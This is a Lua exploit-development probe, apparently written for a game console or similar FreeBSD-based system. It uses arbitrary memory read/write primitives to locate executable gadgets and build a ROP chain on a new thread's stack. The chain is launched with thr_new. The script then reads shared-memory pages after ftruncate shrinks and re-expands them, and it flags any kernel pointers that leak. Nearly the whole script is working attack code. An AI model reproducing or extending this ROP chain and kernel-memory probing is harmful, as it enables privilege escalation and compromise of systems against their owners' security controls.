-- CRASH_CLASS: HIGH
-- PROBE 1103a: Minimal shm ftruncate test
--
-- Questions to answer:
-- 1. Does fn_addr from child thread produce binary output?
-- 2. Does reading a page truncated away by ftruncate crash past pcall?
-- 3. What does the shm mapping look like after truncation?

print("=== PROBE 1103a: SHM FTRUNCATE MINIMAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end
local function wq2(a, lo, hi) wd(a, lo); wd(a + 4, hi or 0) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eoff(off)
    local lo = tlo + off; local hi = thi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local fn_str = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_lo, fn_hi = 0, 0
if fn_str then
    local hs, ls = fn_str:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
    if hs then fn_hi = tonumber(hs, 16) or 0; fn_lo = tonumber(ls, 16) or 0
    else fn_lo = tonumber(fn_str) or 0 end
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local mdr_lo, mdr_hi = eoff(0x92C67)
local jmp_lo, jmp_hi = eoff(0x42)
for off = 0, 0x100000, 2 do
    local b = rd(tlo + off)
    if b and (b % 0x10000) == 0xFEEB then
        jmp_lo, jmp_hi = eoff(off)
        break
    end
end

local sc455 = mk(455)
local sc477 = mk(477)
local sc480 = mk(480)
local sc482 = mk(482)

-- === TEST A: Does single ftruncate from child produce binary? ===
print("[A] single ftruncate from child")

local LARGE = 0x40000
local SMALL = 0x4000
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAIL shm") return end

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))

for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

local ALLOC = 0x200000
local SSIZE = 0x100000
local stack = sc477(uint64(0), uint64(ALLOC), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_n = N(stack)

local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_lo, tcb_hi = split(tcb)
wq2(tcb_n, tcb_lo, tcb_hi)
local fsb = memory.alloc(8)
local fsb_n = N(fsb)
wq2(fsb_n, tcb_lo, tcb_hi)

local done_flag = memory.alloc(8)
local done_n = N(done_flag)
wq2(done_n, 0, 0)

local rsp = math.floor((stack_n + SSIZE) / 16) * 16 - 8
local pos = 0
local function put(lo, hi)
    wd(rsp + pos * 8, lo)
    wd(rsp + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

-- Chain: sysarch + ONE ftruncate(shm_fd, SMALL) + done marker + spin
put(165, 0)
put(pdr_lo, pdr_hi); put(129, 0)
put(psr_lo, psr_hi)
do local fl, fh = split(fsb_n); put(fl, fh) end
put(fn_lo, fn_hi); put(par_lo, par_hi)

-- ftruncate to SMALL
put(480, 0)
put(pdr_lo, pdr_hi); put(shm_fd, 0)
put(psr_lo, psr_hi); put(SMALL, 0)
put(fn_lo, fn_hi); put(par_lo, par_hi)

-- done marker
put(0xDEAD0001, 0)
put(pdr_lo, pdr_hi)
do local dl, dh = split(done_n); put(dl, dh) end
put(mdr_lo, mdr_hi)
put(jmp_lo, jmp_hi)

print(string.format("chain: %d entries", pos))

local tid_ptr = memory.alloc(8)
local tid_n = N(tid_ptr)
wq2(tid_n, 0, 0)

local param = memory.alloc(0x40)
local pm = N(param)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq2(pm, par_lo, par_hi)
do local sl, sh = split(stack); wq2(pm + 0x10, sl, sh) end
wq2(pm + 0x18, SSIZE, 0)
do local tl, th = split(tid_n); wq2(pm + 0x30, tl, th) end

print("pre-launch")
local ok1, ret1 = pcall(function() return sc455(uint64(pm), uint64(0x38)) end)
print("thr_new=" .. (ok1 and tostring(N(ret1)) or "FAIL"))

-- Wait for child
local waited = 0
for i = 1, 50000 do waited = waited + 1 end
print("tid=" .. (rd(tid_n) or "nil"))

local df = rd(done_n)
print("done_flag=" .. string.format("0x%X", df or 0))

-- === TEST B: Can we read truncated-away pages? ===
print("")
print("[B] reading pages after truncation")
for pg = 0, 15 do
    local ok2, val = pcall(function()
        return memory.read_qword(uint64(map_n + pg * 0x4000))
    end)
    if not ok2 then
        print(string.format("  page %d: CRASH (past pcall)", pg))
    elseif val == nil then
        print(string.format("  page %d: nil", pg))
    else
        print(string.format("  page %d: %s", pg, fmt(val)))
    end
end

print("")
print("alive=" .. tostring(alive()))

-- === TEST C: Re-expand to LARGE, read again ===
print("")
print("[C] re-expand to LARGE and read")
local ok3 = pcall(function() native.fcall_with_rax(stub, 480, shm_fd, LARGE) end)
print("ftruncate_large=" .. tostring(ok3))

for pg = 0, 15 do
    local ok4, val = pcall(function()
        return memory.read_qword(uint64(map_n + pg * 0x4000))
    end)
    if not ok4 then
        print(string.format("  page %d: CRASH", pg))
    elseif val == nil then
        print(string.format("  page %d: nil", pg))
    else
        local h, l = 0, 0
        if type(val) == "table" and val.h then h = val.h; l = val.l
        else l = N(val) end
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        local tag = ""
        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then tag = " *** KERNEL POINTER ***" end
        if h == 0 and l == 0 then tag = " (zero)" end
        if l == (0xAA000000 + pg) and h == (0xBB000000 + pg) then tag = " (sentinel)" end
        print(string.format("  page %d: 0x%08X%08X%s", pg, h, l, tag))
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 1103a COMPLETE ===")
